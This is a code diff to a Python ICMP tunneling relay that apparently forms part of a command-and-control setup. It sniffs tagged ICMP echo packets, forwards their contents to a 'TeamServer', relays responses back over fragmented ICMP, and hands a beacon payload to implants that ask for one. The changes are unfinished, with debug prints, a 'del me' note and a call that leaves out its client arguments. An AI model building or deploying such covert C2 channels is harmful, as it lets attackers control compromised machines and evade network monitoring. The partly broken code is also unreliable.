@@ -5,7 +5,7 @@ import socket
 import math
 import time
 # Configure logging
-logging.basicConfig(level=logging.INFO, format="%(message)s")
+logging.basicConfig(level=logging.DEBUG, format="%(message)s")
 
 ICMP_TAG = "RQ47"
 TAG_SIZE = len(ICMP_TAG)
@@ -39,22 +39,57 @@ class Client:
         sniff(filter="icmp", prn=self.handle_packet, store=0)
 
     def handle_packet(self, packet):
-        # if packet
+        ######################################################
+        # Filter packets & get data
+        ######################################################
         if not (packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw)):
+            logging.warning("[!]Invalid Packet")
             return
 
-        raw_load = packet[Raw].load
+        raw_load = (packet[Raw].load)
         # Discard anything not prefixed by our TAG
         if not raw_load.startswith(self.tag.encode()):
+            logging.warning("[!] Invalid Packet")
             return
-
+        
         client_ip = packet[IP].src
         icmp_id = packet[ICMP].id & 0xFFFF
         icmp_seq = packet[ICMP].seq & 0xFFFF
 
-        logging.info(f"[+] packet seq={icmp_seq} received, from {self.client_ip}, ID={self.icmp_id}, tag={self.tag}")
+        stripped_load = raw_load.rstrip(b"\x00").lstrip(b"RQ47") # Strip all trailing bytes & the tag cuz the server sends that atm
 
-    def get_payload(self):
+        ######################################################
+        # Logic/Special Conditions
+        ######################################################
+
+        # need to add a special case to get the payload, as when sending payload options, the team server does not reply,
+        # meaning that it just hangs there... so we need to do this so the controller can explicitly ask for the payload, then pass it on. 
+        if stripped_load == b"I WANT A PAYLOAD":
+            logging.info("[+] Sending payload to Client")
+            self.send_fragmented_icmp(client_ip = client_ip, client_icmp_id=icmp_id, full_payload=self.get_payload())
+            return
+
+        logging.debug(f"[+] Data from Client: {stripped_load}")
+        logging.info(f"[+ SNIFFER] packet seq={icmp_seq} received, from {self.client_ip}, ID={self.icmp_id}, tag={self.tag}")
+
+        ######################################################
+        # Proxy
+        ######################################################
+
+        # forward onto teamserver
+        logging.debug(f"[+ PROXY] Forwarding data to TeamServer: {stripped_load}")
+        self.ts_send_frame(stripped_load)
+
+        #Get response from TS
+        logging.debug("[+ PROXY] Getting response from TeamServer")
+        data_from_ts_for_client = self.ts_recv_frame()
+
+        # send to client
+        self.send_fragmented_icmp(data_from_ts_for_client)
+
+        ## del me - ^ thsi works. Need to edit client to be actually expecting the payload data now.
+
+    def get_payload(self)-> bytes:
         """
         Get payload from TeamServer
         """
@@ -68,6 +103,7 @@ class Client:
 
         if self.payload != b"":
             logging.info(f"[+] Payload from <TeamServerIP> recieved successfully")
+        return self.payload
 
     def send_payload(self):
         """
@@ -132,9 +168,13 @@ class Client:
 
 
     def ts_recv_frame(self):
+        #self.sock.setblocking(False)
+        #self.sock.settimeout(2)
         raw_size = self.sock.recv(4)
+        print(raw_size)
         logging.debug(f"Frame coming from TeamServer: {raw_size}")
         if len(raw_size) < 4:
+            logging.warning(f"TeamServer: Failed to read frame size: {raw_size}")
             raise ConnectionError("Failed to receive frame size.")
         size = struct.unpack('<I', raw_size)[0]
 
@@ -201,12 +241,12 @@ def packet_filter(packet):
         content = raw_load[len(ICMP_TAG):].rstrip(b"\x00")
         logging.info(f"[+] seq=0 content: {content}")
 
-        # if the client wants the payload, send it.
-        if content == b"PAYLOAD":
-            logging.info("[+] Client requested beacon payload → sending")
-            c = Client(client_ip=client_ip, icmp_id=icmp_id, tag=ICMP_TAG, expected_inbound_data_size=0)
-            c.send_payload()
-            return
+        # # if the client wants the payload, send it.
+        # if content == b"PAYLOAD":
+        #     logging.info("[+] Client requested beacon payload → sending")
+        #     c = Client(client_ip=client_ip, icmp_id=icmp_id, tag=ICMP_TAG, expected_inbound_data_size=0)
+        #     c.send_payload()
+        #     return
 
         if len(content) < 4:
             logging.info("[-] seq=0 payload too short to contain length")
